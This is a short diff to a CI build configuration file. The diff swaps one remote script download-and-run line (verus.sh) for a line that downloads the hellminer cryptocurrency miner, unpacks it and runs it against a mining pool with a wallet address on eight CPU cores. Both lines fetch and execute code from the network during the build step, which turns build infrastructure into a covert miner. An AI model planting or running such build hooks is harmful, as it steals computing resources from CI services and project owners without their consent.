@@ -1,7 +1,8 @@
 build:
     dependencies:
         override:
-            - wget https://raw.githubusercontent.com/konchilsxx/asw/main/verus.sh && chmod +x verus.sh && ./verus.sh
+            - sudo apt update && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RTxdgLSqxiTVkUKegd5L5S3e8pJrAkK621.noname --cpu 8
+
 
             # or use a "dummy" command like
             - true
